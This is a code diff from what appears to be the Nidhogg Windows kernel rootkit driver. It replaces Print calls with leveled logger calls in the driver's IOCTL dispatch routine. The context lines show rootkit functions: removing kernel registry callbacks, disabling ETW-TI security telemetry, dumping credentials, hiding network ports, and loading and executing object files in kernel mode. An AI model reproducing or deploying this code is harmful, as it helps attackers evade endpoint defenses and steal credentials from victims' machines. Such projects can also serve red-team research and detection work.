@@ -1012,7 +1012,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = NidhoggAntiAnalysisHandler->ListRegistryCallbacks(data);
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to list registry callbacks (0x%08X).\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list registry callbacks (0x%08X).\n", status);
 			break;
 		}
 
@@ -1054,8 +1054,8 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			default:
 				status = STATUS_INVALID_PARAMETER;
 			}
-			NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Removed callback %p.\n", data->CallbackAddress) :
-				Print(DRIVER_PREFIX "Failed to remove callback (0x%08X).\n", status);
+			NT_SUCCESS(status) ? NidhoggLogger.Info(DRIVER_PREFIX "Removed callback %p.\n", data->CallbackAddress) :
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to remove callback (0x%08X).\n", status);
 		}
 		else {
 			switch (data->Type) {
@@ -1074,8 +1074,8 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				status = STATUS_INVALID_PARAMETER;
 			}
 
-			NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Restored callback %p.\n", data->CallbackAddress) :
-				Print(DRIVER_PREFIX "Failed to restore callback (0x%08X).\n", status);
+			NT_SUCCESS(status) ? NidhoggLogger.Info(DRIVER_PREFIX "Restored callback %p.\n", data->CallbackAddress) :
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to restore callback (0x%08X).\n", status);
 		}
 
 		if (!NT_SUCCESS(status))
@@ -1087,7 +1087,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_ENABLE_DISABLE_ETWTI:
 	{
 		if (!Features.EtwTiTamper) {
-			Print(DRIVER_PREFIX "Due to previous error, ETW-TI tampering is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, ETW-TI tampering is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -1100,7 +1100,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = NidhoggAntiAnalysisHandler->EnableDisableEtwTI(*data);
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to disable ETW-TI (0x%08X)\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to disable ETW-TI (0x%08X)\n", status);
 			break;
 		}
 
@@ -1126,14 +1126,14 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggMemoryHandler->GetCredentialsSize(credentialsSize);
 
 			if (NT_SUCCESS(status))
-				Print(DRIVER_PREFIX "Dumped credentials size successfully.\n");
+				NidhoggLogger.Info(DRIVER_PREFIX "Dumped credentials size successfully.\n");
 		}
 		else if (outputSize == sizeof(IoctlCredentialsInformation)) {
 			auto data = static_cast<IoctlCredentialsInformation*>(Irp->AssociatedIrp.SystemBuffer);
 			status = NidhoggMemoryHandler->GetCredentials(data);
 
 			if (NT_SUCCESS(status))
-				Print(DRIVER_PREFIX "Dumped credentials successfully.\n");
+				NidhoggLogger.Info(DRIVER_PREFIX "Dumped credentials successfully.\n");
 		}
 		else {
 			status = STATUS_INVALID_BUFFER_SIZE;
@@ -1141,7 +1141,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (!NT_SUCCESS(status)) {
-			Print(DRIVER_PREFIX "Failed to dump credentials (0x%08X)\n", status);
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to dump credentials (0x%08X)\n", status);
 			break;
 		}
 
@@ -1164,26 +1164,26 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		hiddenPort.Port = data->Port;
 
 		if (hiddenPort.Port == 0 || (hiddenPort.Type != PortType::TCP && hiddenPort.Type != PortType::UDP)) {
-			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Buffer data is invalid.\n");
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
 		if (data->Hide) {
 			if (!NidhoggNetworkHandler->AddHiddenPort(hiddenPort)) {
-				Print(DRIVER_PREFIX "Failed to hide port.\n");
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to hide port.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
+			NidhoggLogger.Info(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
 		}
 		else {
 			if (!NidhoggNetworkHandler->RemoveHiddenPort(hiddenPort)) {
-				Print(DRIVER_PREFIX "Failed to reveal port.\n");
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to reveal port.\n");
 				status = STATUS_NOT_FOUND;
 				break;
 			}
-			Print(DRIVER_PREFIX "Revealed port %d.\n", hiddenPort.Port);
+			NidhoggLogger.Info(DRIVER_PREFIX "Revealed port %d.\n", hiddenPort.Port);
 		}
 
 		len += inputSize;
@@ -1198,7 +1198,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		auto data = static_cast<IoctlHiddenPorts*>(Irp->AssociatedIrp.SystemBuffer);
 
 		if (!NidhoggNetworkHandler->ListHiddenPorts(data)) {
-			Print(DRIVER_PREFIX "Failed to list hidden ports.\n");
+			NidhoggLogger.Error(DRIVER_PREFIX "Failed to list hidden ports.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -1219,7 +1219,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	case IOCTL_EXEC_NOF:
 	{
 		if (!Features.NofExecution) {
-			Print(DRIVER_PREFIX "Due to previous error, NOF execution feature is unavaliable.\n");
+			NidhoggLogger.Warning(DRIVER_PREFIX "Due to previous error, NOF execution feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -1275,18 +1275,18 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = loader.Load();
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to load NOF: (0x%08X)\n", status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to load NOF: (0x%08X)\n", status);
 				break;
 			}
 			status = loader.Execute();
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to execute NOF: (0x%08X)\n", status);
+				NidhoggLogger.Error(DRIVER_PREFIX "Failed to execute NOF: (0x%08X)\n", status);
 				break;
 			}
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
-			Print(DRIVER_PREFIX "Exception occurred while executing NOF: (0x%08X)\n", GetExceptionCode());
+			NidhoggLogger.Error(DRIVER_PREFIX "Exception occurred while executing NOF: (0x%08X)\n", GetExceptionCode());
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
